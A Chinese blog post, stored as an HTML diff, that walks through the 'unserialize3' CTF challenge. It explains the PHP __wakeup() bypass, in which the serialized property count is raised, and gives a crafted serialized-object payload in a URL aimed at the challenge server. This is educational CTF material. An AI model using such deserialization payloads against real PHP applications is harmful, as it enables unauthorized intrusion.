@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>攻防世界unserialize3题解及一些知识点 | Orange Wang的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="由题干unserialize:得知与反序列化有关！上来给了一串php代码：    1234567class xctf&amp;#123;                     &#x2F;&#x2F;定义一个名为xctf的类public $flag &#x3D; &amp;#x27;111&amp;#x27;;           &#x2F;&#x2F;定义一个公有的类属性$flag，值为111public function __wakeup()&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界unserialize3题解及一些知识点">
+<meta property="og:url" content="http://example.com/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:site_name" content="Orange Wang的博客">
+<meta property="og:description" content="由题干unserialize:得知与反序列化有关！上来给了一串php代码：    1234567class xctf&amp;#123;                     &#x2F;&#x2F;定义一个名为xctf的类public $flag &#x3D; &amp;#x27;111&amp;#x27;;           &#x2F;&#x2F;定义一个公有的类属性$flag，值为111public function __wakeup()&amp;#123;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-27T09:28:15.000Z">
+<meta property="article:modified_time" content="2022-12-27T11:24:40.663Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Orange Wang的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Orange Wang的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="past-攻防世界unserialize3题解及一些知识点" class="h-entry article article-type-past" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" class="article-date">
+  <time class="dt-published" datetime="2022-12-27T09:28:15.000Z" itemprop="datePublished">2022-12-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      攻防世界unserialize3题解及一些知识点
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>由题干unserialize:得知与反序列化有关！<br>上来给了一串php代码：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                     <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;           <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><br>（推测这个?code&#x3D;应该是让我们以get方式提交code的值）<br>注意发现到有个wakeup()函数，我们要想办法绕过这个函数。</p>
+<p>wakeup()有个执行漏洞:一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数，这也算是一个绕过点</p>
+<p>代码中的__wakeup()方法如果使用就是和unserialize()反序列化函数结合使用的，这里没有序列化字符串，何来反序列化呢？于是，我们这里实例化xctf类并对其使用序列化（这里就实例化xctf类为对象a）<br>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                       <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;             <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;       <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();           <span class="comment">//使用new运算符来实例化该类（xctf）的对象为a</span></span><br><span class="line"> <span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       <span class="comment">//输出被序列化的对象（a）</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>代码执行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">/*xctf类后面有一个1,整个1表示的是xctf类中只有1个属性</span><br><span class="line">__wakeup()漏洞就是与序列化字符串的整个属性个数有关。当序列化字符串所表示的对象，</span><br><span class="line">其序列化字符串中属性个数大于真实属性个数时就会跳过__wakeup的执行，从而造成__wakeup()漏洞</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>因此，我们要反序列化xctf类的同时还要绕过__wakeup方法的执行（如果不绕过__wakeup()方法，那么将会输出bad requests并退出脚本）。<br>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值<code>大于</code>真实个数的属性时就会跳过__wakeup的执行。因此，需要<code>修改序列化字符串中的属性个数</code>：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为3，即如下所示<br><code>O:4:&quot;xctf&quot;:3:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>最后进行url的访问：<br><code>http://111.198.29.45:30940?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>即可得到flag!!!</p>
+<p>下附序列化字符串各部分简单释义：<br>O代表结构类型为：类:4表示类名长度:接着是类名:属性（成员）个数<br>大括号内分别是：属性名类型;长度:名称:值类型:长度:值</p>
+<p>（大量照搬有种负罪感，但是自我的消化与理解必然是个漫长的过程，继续学习，深入理解，加油！）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="clcupgfi1000d28aifjgg8mcn" data-title="攻防世界unserialize3题解及一些知识点" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/12/27/%E4%B8%80%E4%BA%9Bphp%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          一些php魔术方法（unserialize3题解附）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/12/23/XFF%E5%92%8CReferer/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">XFF和Referer</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/01/13/zip%E5%92%8Crar%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E5%8A%A0%E5%AF%86/">zip和rar文件的伪加密</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/13/http%E9%87%8D%E5%AE%9A%E5%90%91/">http重定向</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/07/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%92%8CWebshell/">一句话木马和Webshell</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/03/%E6%90%9C%E9%9B%86%E4%BA%86sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4/">搜集了sqlmap的一些指令</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/02/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">SQL注入笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
